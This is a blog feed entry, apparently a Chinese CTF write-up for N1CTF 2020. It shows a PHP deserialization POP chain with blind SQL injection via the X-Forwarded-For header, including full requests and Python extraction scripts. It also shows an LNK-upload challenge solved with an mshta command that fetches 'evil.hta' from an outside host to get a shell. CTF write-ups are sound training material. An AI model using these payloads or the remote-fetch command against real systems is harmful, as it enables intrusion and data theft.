<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>c1ay</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c1aysec.github.io/"/>
  <updated>2020-10-19T05:28:21.496Z</updated>
  <id>https://c1aysec.github.io/</id>
  
  <author>
    <name>c1ay</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020GACTF writeup</title>
    <link href="https://c1aysec.github.io/2020/10/19/2020%20N1CTF%20writeup/"/>
    <id>https://c1aysec.github.io/2020/10/19/2020 N1CTF writeup/</id>
    <published>2020-10-19T04:18:12.227Z</published>
    <updated>2020-10-19T05:28:21.496Z</updated>
    
    <content type="html"><![CDATA[<p>队伍ID：CUTS，个人参赛，就做出了两道web，最终排名71，哭了</p><p>做出的题目<br><img src="http://pic.c1imber.top/blog/20201019/96npVIgBXvdn.png?imageslim" alt="mark"></p><h3 id="web-SignIn"><a href="#web-SignIn" class="headerlink" title="web-SignIn"></a>web-SignIn</h3><p>这道题自己用注入注入出的key，然后通过key获取的flag，不知道其他师傅都是怎么解的</p><p>题目代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</div><div class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</div><div class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</div><div class="line">            <span class="keyword">return</span> mysqli_error($con);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</div><div class="line">        &#125;</div><div class="line">        mysqli_close($con);</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> $check;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</div><div class="line">    readfile(<span class="string">'/flag'</span>);</div><div class="line">    &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</div><div class="line">    $input = $_GET[<span class="string">'input'</span>];</div><div class="line">unserialize($input);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>查看代码，在flag类当中的getflag方法当中可以获取flag，但是需要满足<code>md5($this-&gt;check)===md5(&quot;key****************&quot;)</code>，所以需要先获取<code>key****************</code>的值</p><p>在<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">刚好flag类当中`__wakeup`方法的位置使用了`stristr`字符串函数，所有这里可以触发ip类的`__toString`方法</div><div class="line"></div><div class="line">构造pop链</div><div class="line"></div><div class="line">```php</div><div class="line">    &lt;?php</div><div class="line">    class ip</div><div class="line">    &#123;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    class flag</div><div class="line">    &#123;</div><div class="line">        public $ip;</div><div class="line">        public function __construct()</div><div class="line">        &#123;</div><div class="line">            $this-&gt;ip=new ip();</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    $obj=new flag();</div><div class="line">    echo serialize($obj);</div><div class="line">    ?&gt;</div></pre></td></tr></table></figure></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">"ip"</span>;O:<span class="number">2</span>:<span class="string">"ip"</span>:<span class="number">0</span>:&#123;&#125;&#125;</div></pre></td></tr></table></figure><p>添加X-Forwarded-For头发送即可，但是这里经过了ip类的waf函数，这里并不知道过滤了什么，简单测试了一下，输入sleep等关键字会提示hackhack</p><p>尝试了好久的注入，发现并没有明显的响应可以判断是否存在注入，被这个<code>$this-&gt;waf</code>卡了好久</p><p>于是又仔细读了一遍代码，发现在ip类当中返回了sql的错误信息，但是并没有输出到页面当中，而是赋值给了flag类当中的<code>$this-&gt;ip</code></p><p><img src="http://pic.c1imber.top/blog/20201019/xneAxLf2mmUj.png?imageslim" alt="mark"></p><p>那么如果这里返回的错误信息当中有n1ctf就会输出welcome to n1ctf2020,否则就会输出noip，所以可以通过这种方式进行盲注</p><p>于是需要解决的问题就变为了如何让sql错误信息当中出现n1ctf，查看代码看到当前的数据库名刚好为n1ctf_websign，于是构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if((1=1),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p>此时if判断为true，执行了<figure class="highlight plain"><figcaption><span>into n1ip(`ip`,`time`) VALUES ('1.1.1.1' and updatexml(1,1,1) and '1'</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">![mark](http://pic.c1imber.top/blog/20201019/oeliQVlUrcYw.png?imageslim)</div><div class="line"></div><div class="line">构造：</div></pre></td></tr></table></figure></p><pre><code>GET /index.php?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{}} HTTP/1.1Host: 101.32.205.189User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if((1=2),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">此时if判断为false，语句执行了```INSERT into n1ip(`ip`,`time`) VALUES (&apos;1.1.1.1&apos; and updatexml(1,concat(0x3a,database()),1) and &apos;1&apos;=&apos;&apos;,time())```，后端sql报错信息大概是`XPATH syntax error: &apos;:n1ctf_websign&apos;`，错误信息返回给了flag类的`$this-&gt;ip`，从报错信息当中匹配到了n1ctf，于是这里输出了welcome to n1ctf2020</div><div class="line"></div><div class="line">![mark](http://pic.c1imber.top/blog/20201019/zRDmddNxLzGp.png?imageslim)</div><div class="line"></div><div class="line">为了方便理解，可以看下面两张图：</div><div class="line"></div><div class="line">![mark](http://pic.c1imber.top/blog/20201019/yJPwEKA1y5x5.png?imageslim)</div><div class="line"></div><div class="line">![mark](http://pic.c1imber.top/blog/20201019/SDj1pxAY1PO3.png?imageslim)</div><div class="line"></div><div class="line">接着盲注，首先获取表名</div></pre></td></tr></table></figure><pre><code>GET /index.php?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{}} HTTP/1.1Host: 101.32.205.189User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=10),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![mark](http://pic.c1imber.top/blog/20201019/7BzQoMG6PUpx.png?imageslim)</div><div class="line"></div><div class="line">通过代码已知一个表n1ip，group_concat(table_name)总长度为10，于是剩下一个表长度为5（因为group_concat结果中有一个逗号）</div><div class="line">推测另一个表为n1key,推测成立</div></pre></td></tr></table></figure><pre><code>GET /index.php?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{}} HTTP/1.1Host: 101.32.205.189User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select table_name from information_schema.tables where table_schema=database() limit 1,1)=&apos;n1key&apos;),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![mark](http://pic.c1imber.top/blog/20201019/v1XC5qtJWGBu.png?imageslim)</div><div class="line"></div><div class="line">获取n1key表当中的列名</div></pre></td></tr></table></figure><pre><code>GET /index.php?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{}} HTTP/1.1Host: 101.32.205.189User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(group_concat(column_name)) from information_schema.columns where table_name=&apos;n1key&apos;)=6),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![mark](http://pic.c1imber.top/blog/20201019/ryuxqTqw3HWH.png?imageslim)</div><div class="line"></div><div class="line">判断出group_concat(column_name)长度为6</div><div class="line"></div><div class="line">编写获取列名脚本</div><div class="line"></div><div class="line">```python</div><div class="line">    import requests </div><div class="line"></div><div class="line">    session = requests.Session()    </div><div class="line"></div><div class="line">    column=&quot;&quot;   </div><div class="line"></div><div class="line">    for i in range(1,7):</div><div class="line">        for j in range(97,127):</div><div class="line">            paramsGet = &#123;&quot;input&quot;:&quot;O:4:\&quot;flag\&quot;:1:&#123;s:2:\&quot;ip\&quot;;O:2:\&quot;ip\&quot;:0:&#123;&#125;&#125;&quot;&#125;</div><div class="line">            headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,&quot;Cache-Control&quot;:&quot;max-age=0&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;X-Forwarded-For&quot;:&quot;1.1.1.1&apos; and updatexml(1,if(((select ascii(substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&apos;n1key&apos;)=&#123;&#125;),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;&quot;.format(i,j),&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;&#125;</div><div class="line">            #print headers</div><div class="line">            response = session.get(&quot;http://101.32.205.189/index.php&quot;, params=paramsGet, headers=headers)</div><div class="line">            #print response.content</div><div class="line">            if &quot;&lt;code&gt;noip&lt;/code&gt;&lt;/pre&gt;&quot; in response.content:</div><div class="line">                column+=chr(j)</div><div class="line">                print column</div><div class="line">                break</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/i4CnEN4f77Ru.png?imageslim" alt="mark"></p><p>两列：id和key</p><p>判断出n1key当中key列内容长度为25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(`key`) from n1key)=25),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/iugN92MoTJQf.png?imageslim" alt="mark"></p><p>编写获取key脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line">l=<span class="string">"1234567890qazxswedcvfrtgbnhyujmkiolp"</span></div><div class="line">session = requests.Session()</div><div class="line">key=<span class="string">""</span>  </div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsGet = &#123;<span class="string">"input"</span>:<span class="string">"O:4:\"flag\":1:&#123;s:2:\"ip\";O:2:\"ip\":0:&#123;&#125;&#125;"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and updatexml(1,if(((select substr(`key`,&#123;&#125;,1) from n1key)='&#123;&#125;'),1,concat(0x3a,database())),1) and '1'='"</span>.format(i,j),<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>&#125;</div><div class="line">        response = session.get(<span class="string">"http://101.32.205.189/index.php"</span>, params=paramsGet, headers=headers)</div><div class="line">        <span class="keyword">if</span> <span class="string">"&lt;code&gt;noip&lt;/code&gt;&lt;/pre&gt;"</span> <span class="keyword">in</span> response.content:</div><div class="line">            key+=j</div><div class="line">            <span class="keyword">print</span> key</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/LLgzWYcmT0vu.png?imageslim" alt="mark"></p><p>获取到key为n1ctf20205bf75ab0a30dfc0c</p><p>之后就是通过反序列化构造poc获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $check;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;check=<span class="string">"n1ctf20205bf75ab0a30dfc0c"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> flag());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"check"</span>;s:<span class="number">25</span>:<span class="string">"n1ctf20205bf75ab0a30dfc0c"</span>;&#125;</div></pre></td></tr></table></figure><p>成功获取flag</p><p><img src="http://pic.c1imber.top/blog/20201019/0zSO8n89joWU.png?imageslim" alt="mark"></p><p><code>n1ctf{you_g0t_1t_hack_for_fun}</code></p><h3 id="The-King-Of-Phish-Victim-Bot"><a href="#The-King-Of-Phish-Victim-Bot" class="headerlink" title="The King Of Phish (Victim Bot)"></a>The King Of Phish (Victim Bot)</h3><p>python代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Victim bot</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> LnkParse3 <span class="keyword">as</span> Lnk</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request    </div><div class="line"></div><div class="line">app = Flask(__name__)   </div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    source = open(__file__, <span class="string">'r'</span>).read().replace(<span class="string">"\n"</span>, <span class="string">"\x3c\x62\x72\x3e"</span>).replace(<span class="string">" "</span>, <span class="string">"\x26\x6e\x62\x73\x70\x3b"</span>)</div><div class="line">    <span class="keyword">return</span> source   </div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/send', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</div><div class="line">        <span class="keyword">return</span> <span class="string">'No file part'</span></div><div class="line">    file = request.files[<span class="string">'file'</span>]    </div><div class="line"></div><div class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'No selected file'</span></div><div class="line">    data = file.stream.read()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b"\x4c\x00"</span>):</div><div class="line">        <span class="keyword">return</span> <span class="string">"You're a bad guy!"</span></div><div class="line">    shortcut = Lnk.lnk_file(indata=data)</div><div class="line">    <span class="keyword">if</span> shortcut.data[<span class="string">'command_line_arguments'</span>].count(<span class="string">" "</span>):</div><div class="line">        <span class="keyword">return</span> <span class="string">"File is killed by antivirus."</span></div><div class="line">    filename = str(uuid.uuid4())+<span class="string">".lnk"</span></div><div class="line">    fullname = os.path.join(os.path.abspath(os.curdir) + <span class="string">"/uploads"</span>, filename)</div><div class="line">    open(fullname, <span class="string">"wb"</span>).write(data)</div><div class="line">    clickLnk(fullname)</div><div class="line">    <span class="keyword">return</span> <span class="string">"Clicked."</span>   </div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clickLnk</span><span class="params">(lnkPath)</span>:</span></div><div class="line">    subprocess.run(<span class="string">'cmd /c "%s"'</span> % lnkPath, capture_output=<span class="keyword">True</span>, shell=<span class="keyword">True</span>, check=<span class="keyword">True</span>)    </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>阅读代码，看样子是需要上传lnk文件，然后执行文件getshell，但是不能有空格</p><p><a href="https://pypi.org/project/LnkParse3/" title="LnkParse3" target="_blank" rel="external">LnkParse3库</a></p><p><img src="http://pic.c1imber.top/blog/20201019/KyqOV7gofEVV.png?imageslim" alt="mark"></p><p>最终找到可以上线的方法，通过mshta上线</p><p><img src="http://pic.c1imber.top/blog/20201019/Hhpafp83VpVa.png?imageslim" alt="mark"></p><p>制作test.lnk</p><p><code>C:\Windows\System32\mshta.exe http://47.105.186.146/evil.hta</code></p><p><img src="http://pic.c1imber.top/blog/20201019/mo10ohGM8b8T.png?imageslim" alt="mark"></p><p>测试无空格</p><p><img src="http://pic.c1imber.top/blog/20201019/lX5suqqRMghM.png?imageslim" alt="mark"></p><p>上传test.lnk，上线成功</p><p><img src="http://pic.c1imber.top/blog/20201019/VYXmO3FAq1H8.png?imageslim" alt="mark"></p><p>根据题目提示，最终在<code>C:\Users\UserA\Desktop\flag.txt</code>当中获取到了flag</p><p><img src="http://pic.c1imber.top/blog/20201019/7KDXlnagc5S7.png?imageslim" alt="mark"></p><p><code>n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean}</code></p><p>在<code>C:\Users\UserA\Desktop\</code>目录下还看到了CVE-2020-1472目录，但是这个不影响获取flag，应该和后面的The King Of Phish (UserA-PC)或者The King Of Phish (DC)有关</p><p>个人感觉这道题比web签到更简单一些，但是做出的人却比web签到少</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;队伍ID：CUTS，个人参赛，就做出了两道web，最终排名71，哭了&lt;/p&gt;
&lt;p&gt;做出的题目&lt;br&gt;&lt;img src=&quot;http://pic.c1imber.top/blog/20201019/96npVIgBXvdn.png?imageslim&quot; alt=&quot;mark&quot;&gt;
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020GACTF writeup</title>
    <link href="https://c1aysec.github.io/2020/08/31/2020GACTF%20writeup/"/>
